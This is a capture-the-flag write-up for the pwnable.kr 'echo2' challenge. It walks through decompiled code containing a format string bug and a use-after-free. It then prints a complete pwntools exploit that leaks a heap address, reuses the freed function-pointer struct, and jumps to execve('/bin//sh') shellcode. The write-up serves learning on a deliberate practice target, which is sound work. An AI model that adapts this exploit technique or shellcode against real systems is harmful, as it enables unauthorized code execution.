---
layout: page
title: pwnable.kr - echo2
category: pwnablekr
tags: [writeup, pwn, pwnablekr]
---


Same as echo1, except we got Format String Bug and Use-After-Free instead of BOF.

Checksec:
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```

Running binary:
```
hey, what's your name? : test

- select echo type -
- 1. : BOF echo
- 2. : FSB echo
- 3. : UAF echo
- 4. : exit
> 2
hello test
%x.%x
521548d0.abc46350

goodbye test

- select echo type - ...
```

Here's the vulnerable UAF function:

```c
__int64 echo3()
{
  char *s; // ST08_8

  func_array->print_hello(func_array);
  s = (char *)malloc(0x20uLL);
  get_input(s, 0x20);
  puts(s);
  free(s);
  func_array->print_goodbye(func_array, 0x20LL);
  return 0LL;
}
```

At the beginning of `main` function there is `func_array` allocation:
```c
struct struct_func_array
{
  char name[24];
  void (__fastcall *print_hello)(void *);
  void (__fastcall *print_goodbye)(void *, signed __int64);
};

func_array = malloc(0x28uLL);
func_array->print_hello = (void (__fastcall *)(void *))greetings;
func_array->print_goodbye = (void (__fastcall *)(void *, signed __int64))byebye;
printf("hey, what's your name? : ", 0LL);
__isoc99_scanf("%24s", &name);
func_array->name = name;
```

Main function loop:
```c
do {
    while ( 1 ) {
        while ( 1 ) {
            puts("\n- select echo type -");
            puts("- 1. : BOF echo");
            puts("- 2. : FSB echo");
            puts("- 3. : UAF echo");
            puts("- 4. : exit");
            printf("> ", v3);
            v3 = &v6;
            __isoc99_scanf("%d", &v6);
            getchar();
            if ( v6 > 3 )
            break;
            ((void (__fastcall *)(const char *, unsigned int *))func[v6 - 1])("%d", &v6);
        }
        if ( v6 == 4 )
        break;
        puts("invalid menu");
    }
    cleanup();
    printf("Are you sure you want to exit? (y/n)", &v6);
    v6 = getchar();
} while ( v6 != 'y' );
puts("bye");
```

```c
void cleanup()
{
  free(func_array);
}
```

To exploit UAF, we can call `cleanup` (`func_array` ptr will be freed and but into fastbin/tcache) and then `echo3` (`malloc` will return `func_ptr` and we wil overwrite pointers to `greetings` and `byebye`).

Last thing is to place shellcode somewhere (I used first 24 bytes send in `echo3`) and get address of it.

We can get the address in two ways:
* making additional malloc before `cleanup`. As `func_array` chunk will get freed, its first bytes (`func_array->name`) will be overwritten with pointer to next free chunk and we can leak that when `greetings` function will be called. It is a bit unreliable though, because heap offsets depends on libc version.
* use FMB, easily and reliably

The exploit:
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
~Gros
'''

from pwn import *
import re
import argparse
import subprocess
from binascii import *


BINARY_FILE = './echo2'
REMOTE = ('pwnable.kr', 9011)


def setup_connection():
    binary, libc, preload = None, None, False
    local_libc = '/lib/x86_64-linux-gnu/libc.so.6'
    task_libc = './libc.so.6'

    env = {}
    if args.PRELOAD:
        local_libc = task_libc
        env = {'LD_PRELOAD': task_libc}

    if args.BINARY:
        binary = ELF(BINARY_FILE)
        context.arch = binary.arch

    if args.REMOTE:
        if args.LIBC:
            libc = ELF(task_libc)
        s = remote(*REMOTE)
    else:
        if args.LIBC:
            libc = ELF(local_libc)
        
        s = process(BINARY_FILE, stderr=open('/dev/null', 'w+'), env=env)
        if args.GDB:
            context.terminal = ['gnome-terminal', '-e']
            breakpoints = []
            gdb.attach(s, exe=BINARY_FILE, gdbscript='\n'.join(['b *'+str(x) for x in breakpoints]))
            
    return s, binary, libc


if __name__ == '__main__':
    s, binary, libc = setup_connection()

    context.update(arch = 'amd64')

    # send name
    s.recvuntil("hey, what's your name? :")
    s.sendline('test')
    s.recvuntil('>')

    # leak with FMB
    payload = '%7$s'
    payload += 'A'*4
    payload += p64(0x602098)

    s.sendline('2')
    s.recvuntil('hello test\n')
    s.sendline(payload)
    leak = s.recvuntil('AAAA')[:-4].ljust(8, '\x00')
    leak = u64(leak)
    print('Heap leak: {}'.format(hex(leak)))

    # malloc, free
    s.sendline('3')
    s.recvuntil('hello ')
    s.sendline('nothing')

    # free
    s.sendline('4')
    s.recvuntil('(y/n')
    s.sendline('n')

    # UAF - leak
    s.sendline('3')
    s.recvuntil('hello ')
    leak2 = s.recvuntil('\n')[:-1].ljust(8, '\x00')
    leak2 = u64(leak2)
    shell_addr = leak + 0x30

    print('Heap leak2: {}'.format(hex(leak2)))
    print('Shellcode addr: {}'.format(hex(shell_addr)))

    # UAF - overwrite
    payload = asm('''xor    esi,esi
                    movabs rbx,0x68732f2f6e69622f
                    push   rsi
                    push   rbx
                    push   rsp
                    pop    rdi
                    push   0x3b
                    pop    rax
                    xor    edx,edx
                    syscall
                    nop
                    '''
                )
    payload += p64(shell_addr)
    assert len(payload) == 32, len(payload)

    s.send(payload)

    s.recvuntil('> ')
    s.interactive()
```